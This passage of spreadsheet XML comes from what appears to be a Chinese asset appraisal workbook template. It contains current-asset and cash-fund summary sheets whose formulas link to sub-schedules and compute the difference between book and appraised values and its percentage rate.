      <c r="F68" s="410" t="n"/>
      <c r="G68" s="410" t="n"/>
      <c r="H68" s="412" t="inlineStr">
        <is>
          <t>报表净资产</t>
        </is>
      </c>
      <c r="I68" s="562" t="n"/>
      <c r="K68" s="410" t="n"/>
    </row>
    <row r="69" outlineLevel="1" s="415">
      <c r="B69" s="344" t="n"/>
      <c r="C69" s="410" t="n"/>
      <c r="D69" s="411" t="n"/>
      <c r="E69" s="410" t="n"/>
      <c r="F69" s="410" t="n"/>
      <c r="G69" s="410" t="n"/>
      <c r="H69" s="412" t="inlineStr">
        <is>
          <t>校验</t>
        </is>
      </c>
      <c r="I69" s="562">
        <f>IF(I68=0,"",IF(ABS(I65-I68)&lt;0.005,"一致","差异:"&amp;TEXT(I65-I68,"#,##0.00")))</f>
        <v/>
      </c>
      <c r="K69" s="410" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="2">
    <mergeCell ref="B1:H1"/>
    <mergeCell ref="B2:H2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scale="95" fitToHeight="0" blackAndWhite="1"/>
  <rowBreaks count="1" manualBreakCount="1">
    <brk id="35" min="0" max="7" man="1"/>
  </rowBreaks>
</worksheet>
</file>

<file path=xl/worksheets/sheet9.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet8">
    <tabColor rgb="FFFFFF00"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:K27"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A26" sqref="A26"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="8.66666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col hidden="1" width="8.66666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="31.1666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="21.1666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="18.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="16.1666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col width="17.3333333333333" customWidth="1" style="410" min="8" max="8"/>
    <col width="9" customWidth="1" style="410" min="9" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>流动资产评估汇总表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="17.25" customHeight="1" s="415">
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
      <c r="I2" s="376" t="n"/>
      <c r="J2" s="376" t="n"/>
    </row>
    <row r="3" ht="14" customFormat="1" customHeight="1" s="116">
      <c r="B3" s="376" t="n"/>
      <c r="C3" s="376" t="n"/>
      <c r="D3" s="376" t="n"/>
      <c r="E3" s="376" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="547" t="n"/>
      <c r="H3" s="548" t="inlineStr">
        <is>
          <t>表3</t>
        </is>
      </c>
      <c r="I3" s="376" t="n"/>
      <c r="J3" s="376" t="n"/>
    </row>
    <row r="4" ht="21" customFormat="1" customHeight="1" s="116">
      <c r="B4" s="563">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="F4" s="329" t="n"/>
      <c r="G4" s="329" t="n"/>
      <c r="H4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
    </row>
    <row r="5" ht="21" customFormat="1" customHeight="1" s="373">
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>编号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>项目编号</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>科目名称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44" t="n"/>
      <c r="J5" s="344" t="n"/>
      <c r="K5" s="344" t="n"/>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B6" s="170" t="inlineStr">
        <is>
          <t>3-1</t>
        </is>
      </c>
      <c r="C6" s="170" t="inlineStr">
        <is>
          <t>货币汇总</t>
        </is>
      </c>
      <c r="D6" s="381" t="inlineStr">
        <is>
          <t>货币资金</t>
        </is>
      </c>
      <c r="E6" s="555">
        <f>'3-1货币资金汇总表'!E23</f>
        <v/>
      </c>
      <c r="F6" s="555">
        <f>'3-1货币资金汇总表'!F23</f>
        <v/>
      </c>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="555">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
      <c r="I6" s="347" t="n"/>
      <c r="J6" s="347" t="n"/>
      <c r="K6" s="399" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B7" s="170" t="inlineStr">
        <is>
          <t>3-2</t>
        </is>
      </c>
      <c r="C7" s="170" t="inlineStr">
        <is>
          <t>交融汇总</t>
        </is>
      </c>
      <c r="D7" s="180" t="inlineStr">
        <is>
          <t>交易性金融资产</t>
        </is>
      </c>
      <c r="E7" s="555">
        <f>'3-2交易性金融资产汇总'!E24</f>
        <v/>
      </c>
      <c r="F7" s="555">
        <f>'3-2交易性金融资产汇总'!F24</f>
        <v/>
      </c>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="555">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
      <c r="I7" s="347" t="n"/>
      <c r="J7" s="347" t="n"/>
      <c r="K7" s="399" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B8" s="170" t="inlineStr">
        <is>
          <t>3-3</t>
        </is>
      </c>
      <c r="C8" s="170" t="inlineStr">
        <is>
          <t>衍金资产</t>
        </is>
      </c>
      <c r="D8" s="180" t="inlineStr">
        <is>
          <t>衍生金融资产</t>
        </is>
      </c>
      <c r="E8" s="555">
        <f>'3-3衍生金融资产'!F27</f>
        <v/>
      </c>
      <c r="F8" s="555">
        <f>'3-3衍生金融资产'!G27</f>
        <v/>
      </c>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="555">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
      <c r="I8" s="347" t="n"/>
      <c r="J8" s="347" t="n"/>
      <c r="K8" s="399" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B9" s="170" t="inlineStr">
        <is>
          <t>3-4</t>
        </is>
      </c>
      <c r="C9" s="170" t="inlineStr">
        <is>
          <t>应收票据</t>
        </is>
      </c>
      <c r="D9" s="180" t="inlineStr">
        <is>
          <t>应收票据</t>
        </is>
      </c>
      <c r="E9" s="555">
        <f>'3-4应收票据'!G29</f>
        <v/>
      </c>
      <c r="F9" s="555">
        <f>'3-4应收票据'!H29</f>
        <v/>
      </c>
      <c r="G9" s="555">
        <f>F9-E9</f>
        <v/>
      </c>
      <c r="H9" s="555">
        <f>IF(E9=0,"",G9/E9*100)</f>
        <v/>
      </c>
      <c r="I9" s="347" t="n"/>
      <c r="J9" s="347" t="n"/>
      <c r="K9" s="399" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B10" s="170" t="inlineStr">
        <is>
          <t>3-5</t>
        </is>
      </c>
      <c r="C10" s="170" t="inlineStr">
        <is>
          <t>应收账款</t>
        </is>
      </c>
      <c r="D10" s="180" t="inlineStr">
        <is>
          <t>应收账款</t>
        </is>
      </c>
      <c r="E10" s="555">
        <f>'3-5应收账款'!J29</f>
        <v/>
      </c>
      <c r="F10" s="555">
        <f>'3-5应收账款'!K29</f>
        <v/>
      </c>
      <c r="G10" s="555">
        <f>F10-E10</f>
        <v/>
      </c>
      <c r="H10" s="555">
        <f>IF(E10=0,"",G10/E10*100)</f>
        <v/>
      </c>
      <c r="I10" s="347" t="n"/>
      <c r="J10" s="347" t="n"/>
      <c r="K10" s="399" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B11" s="170" t="inlineStr">
        <is>
          <t>3-6</t>
        </is>
      </c>
      <c r="C11" s="170" t="inlineStr">
        <is>
          <t>应收融资</t>
        </is>
      </c>
      <c r="D11" s="180" t="inlineStr">
        <is>
          <t>应收款项融资</t>
        </is>
      </c>
      <c r="E11" s="555">
        <f>'3-6应收款项融资'!J29</f>
        <v/>
      </c>
      <c r="F11" s="555">
        <f>'3-6应收款项融资'!K29</f>
        <v/>
      </c>
      <c r="G11" s="555">
        <f>F11-E11</f>
        <v/>
      </c>
      <c r="H11" s="555">
        <f>IF(E11=0,"",G11/E11*100)</f>
        <v/>
      </c>
      <c r="I11" s="347" t="n"/>
      <c r="J11" s="347" t="n"/>
      <c r="K11" s="399" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B12" s="170" t="inlineStr">
        <is>
          <t>3-7</t>
        </is>
      </c>
      <c r="C12" s="170" t="inlineStr">
        <is>
          <t>预付账款</t>
        </is>
      </c>
      <c r="D12" s="381" t="inlineStr">
        <is>
          <t>预付款项</t>
        </is>
      </c>
      <c r="E12" s="555">
        <f>'3-7预付款项'!J28</f>
        <v/>
      </c>
      <c r="F12" s="555">
        <f>'3-7预付款项'!K28</f>
        <v/>
      </c>
      <c r="G12" s="555">
        <f>F12-E12</f>
        <v/>
      </c>
      <c r="H12" s="555">
        <f>IF(E12=0,"",G12/E12*100)</f>
        <v/>
      </c>
      <c r="I12" s="347" t="n"/>
      <c r="J12" s="347" t="n"/>
      <c r="K12" s="399" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B13" s="170" t="inlineStr">
        <is>
          <t>3-8</t>
        </is>
      </c>
      <c r="C13" s="170" t="inlineStr">
        <is>
          <t>其他应收</t>
        </is>
      </c>
      <c r="D13" s="381" t="inlineStr">
        <is>
          <t>其他应收款</t>
        </is>
      </c>
      <c r="E13" s="555">
        <f>'3-8其他应收款汇总'!E25</f>
        <v/>
      </c>
      <c r="F13" s="555">
        <f>'3-8其他应收款汇总'!F25</f>
        <v/>
      </c>
      <c r="G13" s="555">
        <f>F13-E13</f>
        <v/>
      </c>
      <c r="H13" s="555">
        <f>IF(E13=0,"",G13/E13*100)</f>
        <v/>
      </c>
      <c r="I13" s="347" t="n"/>
      <c r="J13" s="347" t="n"/>
      <c r="K13" s="399" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B14" s="170" t="inlineStr">
        <is>
          <t>3-9</t>
        </is>
      </c>
      <c r="C14" s="170" t="inlineStr">
        <is>
          <t>存货汇总</t>
        </is>
      </c>
      <c r="D14" s="381" t="inlineStr">
        <is>
          <t>存货</t>
        </is>
      </c>
      <c r="E14" s="555">
        <f>'3-9存货汇总'!E23</f>
        <v/>
      </c>
      <c r="F14" s="555">
        <f>'3-9存货汇总'!F23</f>
        <v/>
      </c>
      <c r="G14" s="555">
        <f>F14-E14</f>
        <v/>
      </c>
      <c r="H14" s="555">
        <f>IF(E14=0,"",G14/E14*100)</f>
        <v/>
      </c>
      <c r="I14" s="347" t="n"/>
      <c r="J14" s="347" t="n"/>
      <c r="K14" s="399" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B15" s="170" t="inlineStr">
        <is>
          <t>3-10</t>
        </is>
      </c>
      <c r="C15" s="170" t="inlineStr">
        <is>
          <t>合同资产</t>
        </is>
      </c>
      <c r="D15" s="180" t="inlineStr">
        <is>
          <t>合同资产</t>
        </is>
      </c>
      <c r="E15" s="555">
        <f>'3-10合同资产'!F29</f>
        <v/>
      </c>
      <c r="F15" s="555">
        <f>'3-10合同资产'!G29</f>
        <v/>
      </c>
      <c r="G15" s="555">
        <f>F15-E15</f>
        <v/>
      </c>
      <c r="H15" s="555">
        <f>IF(E15=0,"",G15/E15*100)</f>
        <v/>
      </c>
      <c r="I15" s="347" t="n"/>
      <c r="J15" s="347" t="n"/>
      <c r="K15" s="399" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B16" s="170" t="inlineStr">
        <is>
          <t>3-11</t>
        </is>
      </c>
      <c r="C16" s="170" t="inlineStr">
        <is>
          <t>持有待资</t>
        </is>
      </c>
      <c r="D16" s="180" t="inlineStr">
        <is>
          <t>持有待售资产</t>
        </is>
      </c>
      <c r="E16" s="555">
        <f>'3-11持有待售资产'!I30</f>
        <v/>
      </c>
      <c r="F16" s="555">
        <f>'3-11持有待售资产'!J30</f>
        <v/>
      </c>
      <c r="G16" s="555">
        <f>F16-E16</f>
        <v/>
      </c>
      <c r="H16" s="555">
        <f>IF(E16=0,"",G16/E16*100)</f>
        <v/>
      </c>
      <c r="I16" s="347" t="n"/>
      <c r="J16" s="347" t="n"/>
      <c r="K16" s="399" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B17" s="170" t="inlineStr">
        <is>
          <t>3-12</t>
        </is>
      </c>
      <c r="C17" s="170" t="inlineStr">
        <is>
          <t>到期非流</t>
        </is>
      </c>
      <c r="D17" s="381" t="inlineStr">
        <is>
          <t>一年内到期的非流动资产</t>
        </is>
      </c>
      <c r="E17" s="555">
        <f>'3-12一年到期非流动资产'!F28</f>
        <v/>
      </c>
      <c r="F17" s="555">
        <f>'3-12一年到期非流动资产'!G28</f>
        <v/>
      </c>
      <c r="G17" s="555">
        <f>F17-E17</f>
        <v/>
      </c>
      <c r="H17" s="555">
        <f>IF(E17=0,"",G17/E17*100)</f>
        <v/>
      </c>
      <c r="I17" s="347" t="n"/>
      <c r="J17" s="347" t="n"/>
      <c r="K17" s="399" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B18" s="170" t="inlineStr">
        <is>
          <t>3-13</t>
        </is>
      </c>
      <c r="C18" s="170" t="inlineStr">
        <is>
          <t>其他流资</t>
        </is>
      </c>
      <c r="D18" s="381" t="inlineStr">
        <is>
          <t>其他流动资产</t>
        </is>
      </c>
      <c r="E18" s="555">
        <f>'3-13其他流动资产'!G28</f>
        <v/>
      </c>
      <c r="F18" s="555">
        <f>'3-13其他流动资产'!H28</f>
        <v/>
      </c>
      <c r="G18" s="555">
        <f>F18-E18</f>
        <v/>
      </c>
      <c r="H18" s="555">
        <f>IF(E18=0,"",G18/E18*100)</f>
        <v/>
      </c>
      <c r="I18" s="347" t="n"/>
      <c r="J18" s="347" t="n"/>
      <c r="K18" s="399" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B19" s="284" t="n"/>
      <c r="C19" s="284" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="inlineStr"/>
      <c r="I19" s="347" t="n"/>
      <c r="J19" s="347" t="n"/>
      <c r="K19" s="399" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B20" s="284" t="n"/>
      <c r="C20" s="284" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="inlineStr"/>
      <c r="I20" s="347" t="n"/>
      <c r="J20" s="347" t="n"/>
      <c r="K20" s="399" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B21" s="284" t="n"/>
      <c r="C21" s="284" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="inlineStr"/>
      <c r="I21" s="347" t="n"/>
      <c r="J21" s="347" t="n"/>
      <c r="K21" s="399" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B22" s="284" t="n"/>
      <c r="C22" s="284" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="inlineStr"/>
      <c r="I22" s="347" t="n"/>
      <c r="J22" s="347" t="n"/>
      <c r="K22" s="399" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B23" s="284" t="n"/>
      <c r="C23" s="284" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="555" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="inlineStr"/>
      <c r="I23" s="347" t="n"/>
      <c r="J23" s="347" t="n"/>
      <c r="K23" s="399" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B24" s="284" t="n"/>
      <c r="C24" s="284" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="555" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="inlineStr"/>
      <c r="I24" s="347" t="n"/>
      <c r="J24" s="347" t="n"/>
      <c r="K24" s="399" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B25" s="284" t="n"/>
      <c r="C25" s="284" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="555" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="inlineStr"/>
      <c r="I25" s="347" t="n"/>
      <c r="J25" s="347" t="n"/>
      <c r="K25" s="399" t="n"/>
    </row>
    <row r="26" ht="18" customFormat="1" customHeight="1" s="389">
      <c r="A26" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B26" s="383" t="n"/>
      <c r="C26" s="423" t="inlineStr">
        <is>
          <t>流资汇总</t>
        </is>
      </c>
      <c r="D26" s="380" t="inlineStr">
        <is>
          <t>流动资产合计</t>
        </is>
      </c>
      <c r="E26" s="555">
        <f>SUM(E6:E25)</f>
        <v/>
      </c>
      <c r="F26" s="555">
        <f>SUM(F6:F25)</f>
        <v/>
      </c>
      <c r="G26" s="555">
        <f>F26-E26</f>
        <v/>
      </c>
      <c r="H26" s="555">
        <f>IF(E26=0,"",G26/E26*100)</f>
        <v/>
      </c>
      <c r="I26" s="347" t="n"/>
      <c r="J26" s="347" t="n"/>
      <c r="K26" s="399" t="n"/>
    </row>
    <row r="27" customFormat="1" s="389">
      <c r="B27" s="346" t="n"/>
      <c r="C27" s="346" t="n"/>
      <c r="D27" s="347" t="n"/>
      <c r="E27" s="347" t="n"/>
      <c r="F27" s="333" t="n"/>
      <c r="G27" s="550" t="n"/>
      <c r="H27" s="550" t="n"/>
      <c r="I27" s="347" t="n"/>
      <c r="J27" s="347" t="n"/>
      <c r="K27" s="399" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B1:H1"/>
    <mergeCell ref="B2:H2"/>
    <mergeCell ref="F27:H27"/>
    <mergeCell ref="B4:E4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10.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet10">
    <tabColor rgb="FF92D050"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:L24"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A23" sqref="A23"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.2"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="8.16666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col hidden="1" width="8.16666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="30.3333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="5" max="8"/>
    <col width="12.5" customWidth="1" style="410" min="9" max="9"/>
    <col width="9" customWidth="1" style="410" min="10" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>货币资金评估汇总表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="15.75" customFormat="1" customHeight="1" s="389">
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
      <c r="J2" s="376" t="n"/>
      <c r="K2" s="376" t="n"/>
    </row>
    <row r="3" ht="15.75" customFormat="1" customHeight="1" s="116">
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="547" t="n"/>
      <c r="H3" s="548" t="inlineStr">
        <is>
          <t>表3-1</t>
        </is>
      </c>
      <c r="J3" s="376" t="n"/>
      <c r="K3" s="376" t="n"/>
    </row>
    <row r="4" ht="20.25" customFormat="1" customHeight="1" s="387">
      <c r="B4" s="549">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C4" s="549" t="n"/>
      <c r="D4" s="376" t="n"/>
      <c r="E4" s="376" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="390" t="n"/>
      <c r="I4" s="391">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
      <c r="J4" s="376" t="n"/>
      <c r="K4" s="376" t="n"/>
    </row>
    <row r="5" ht="19.5" customFormat="1" customHeight="1" s="388">
      <c r="B5" s="284" t="inlineStr">
        <is>
          <t>编号</t>
        </is>
      </c>
      <c r="C5" s="185" t="inlineStr">
        <is>
          <t>项目编号</t>
        </is>
      </c>
      <c r="D5" s="284" t="inlineStr">
        <is>
          <t>科目名称</t>
        </is>
      </c>
      <c r="E5" s="284" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="F5" s="284" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="G5" s="392" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="H5" s="284" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="I5" s="379" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
      <c r="J5" s="393" t="n"/>
      <c r="K5" s="393" t="n"/>
      <c r="L5" s="394" t="n"/>
    </row>
    <row r="6" ht="19.5" customFormat="1" customHeight="1" s="389">
      <c r="B6" s="284" t="inlineStr">
        <is>
          <t>3-1-1</t>
        </is>
      </c>
      <c r="C6" s="397" t="inlineStr">
        <is>
          <t>货币现金</t>
        </is>
      </c>
      <c r="D6" s="395" t="inlineStr">
        <is>
          <t>现金</t>
        </is>
      </c>
      <c r="E6" s="555">
        <f>'3-1-1现金'!G27</f>
        <v/>
      </c>
      <c r="F6" s="555">
        <f>'3-1-1现金'!H27</f>
        <v/>
      </c>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="555">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
      <c r="I6" s="564" t="n"/>
      <c r="J6" s="347" t="n"/>
      <c r="K6" s="347" t="n"/>
      <c r="L6" s="399" t="n"/>
    </row>
    <row r="7" ht="19.5" customFormat="1" customHeight="1" s="389">
      <c r="B7" s="284" t="inlineStr">
        <is>
          <t>3-1-2</t>
        </is>
      </c>
      <c r="C7" s="397" t="inlineStr">
        <is>
          <t>货币银行</t>
        </is>
      </c>
      <c r="D7" s="396" t="inlineStr">
        <is>
          <t>银行存款</t>
        </is>
      </c>
      <c r="E7" s="555">
        <f>'3-1-2银行存款'!H29</f>
        <v/>
      </c>
      <c r="F7" s="555">
        <f>'3-1-2银行存款'!I29</f>
        <v/>
      </c>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="555">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
      <c r="I7" s="564" t="n"/>
      <c r="J7" s="347" t="n"/>
      <c r="K7" s="347" t="n"/>
      <c r="L7" s="399" t="n"/>
    </row>
    <row r="8" ht="19.5" customFormat="1" customHeight="1" s="389">
      <c r="B8" s="284" t="inlineStr">
        <is>
          <t>3-1-3</t>
        </is>
      </c>
      <c r="C8" s="397" t="inlineStr">
        <is>
          <t>其他货币</t>
        </is>
      </c>
      <c r="D8" s="396" t="inlineStr">
        <is>
          <t>其他货币资金</t>
        </is>
      </c>
      <c r="E8" s="555">
        <f>'3-1-3其他货币资金'!H31</f>
        <v/>
      </c>
      <c r="F8" s="555">
        <f>'3-1-3其他货币资金'!I31</f>
        <v/>
      </c>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="555">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
      <c r="I8" s="564" t="n"/>
      <c r="J8" s="347" t="n"/>
      <c r="K8" s="347" t="n"/>
      <c r="L8" s="399" t="n"/>
    </row>
    <row r="9" ht="19.5" customFormat="1" customHeight="1" s="389">
      <c r="B9" s="284" t="n"/>
      <c r="C9" s="397" t="n"/>
      <c r="D9" s="327" t="n"/>
      <c r="E9" s="555" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="564" t="n"/>
      <c r="J9" s="347" t="n"/>
      <c r="K9" s="347" t="n"/>
      <c r="L9" s="399" t="n"/>
    </row>
    <row r="10" ht="19.5" customFormat="1" customHeight="1" s="389">
      <c r="B10" s="284" t="n"/>
      <c r="C10" s="397" t="n"/>
      <c r="D10" s="327" t="n"/>
      <c r="E10" s="555" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="564" t="n"/>
      <c r="J10" s="347" t="n"/>
      <c r="K10" s="347" t="n"/>
      <c r="L10" s="399" t="n"/>
    </row>
    <row r="11" ht="19.5" customFormat="1" customHeight="1" s="389">
      <c r="B11" s="284" t="n"/>
      <c r="C11" s="397" t="n"/>
      <c r="D11" s="327" t="n"/>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="564" t="n"/>
      <c r="J11" s="347" t="n"/>
      <c r="K11" s="347" t="n"/>
      <c r="L11" s="399" t="n"/>
    </row>
    <row r="12" ht="19.5" customFormat="1" customHeight="1" s="389">
      <c r="B12" s="284" t="n"/>
      <c r="C12" s="397" t="n"/>
      <c r="D12" s="327" t="n"/>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="564" t="n"/>
      <c r="J12" s="347" t="n"/>
      <c r="K12" s="347" t="n"/>
      <c r="L12" s="399" t="n"/>
    </row>
    <row r="13" ht="19.5" customFormat="1" customHeight="1" s="389">
      <c r="B13" s="284" t="n"/>
      <c r="C13" s="397" t="n"/>
      <c r="D13" s="327" t="n"/>
      <c r="E13" s="555" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="564" t="n"/>
      <c r="J13" s="347" t="n"/>
      <c r="K13" s="347" t="n"/>
      <c r="L13" s="399" t="n"/>
    </row>
    <row r="14" ht="19.5" customFormat="1" customHeight="1" s="389">
      <c r="B14" s="284" t="n"/>
      <c r="C14" s="397" t="n"/>
      <c r="D14" s="327" t="n"/>
      <c r="E14" s="555" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="564" t="n"/>
      <c r="J14" s="347" t="n"/>
      <c r="K14" s="347" t="n"/>
      <c r="L14" s="399" t="n"/>
    </row>
    <row r="15" ht="19.5" customFormat="1" customHeight="1" s="389">
      <c r="B15" s="284" t="n"/>
      <c r="C15" s="397" t="n"/>
      <c r="D15" s="327" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="564" t="n"/>
      <c r="J15" s="347" t="n"/>
      <c r="K15" s="347" t="n"/>
      <c r="L15" s="399" t="n"/>
    </row>
    <row r="16" ht="19.5" customFormat="1" customHeight="1" s="389">
      <c r="B16" s="284" t="n"/>
      <c r="C16" s="397" t="n"/>
      <c r="D16" s="327" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="564" t="n"/>
      <c r="J16" s="347" t="n"/>
      <c r="K16" s="347" t="n"/>
      <c r="L16" s="399" t="n"/>
    </row>
    <row r="17" ht="19.5" customFormat="1" customHeight="1" s="389">
